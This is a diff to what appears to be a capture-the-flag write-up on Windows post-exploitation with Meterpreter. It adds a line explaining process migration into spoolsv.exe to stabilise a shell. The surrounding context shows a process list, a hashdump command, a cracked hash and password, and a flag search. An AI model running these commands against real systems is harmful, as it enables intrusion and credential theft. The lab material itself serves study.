@@ -142,6 +142,8 @@ PID   PPID  Name                  Arch  Session  User                          P
  3068  2348  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 ```
 
+`meterpreter > migrate 1296` should attatch our shell to the spoolsv.exe service. This will hopefully make our shell more stable.
+
 ### hashdump
 
 `meterpreter > hashdump`
@@ -163,4 +165,3 @@ ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
 ## capturing the flags
 
 `meterpreter > search -f *flag*`
-
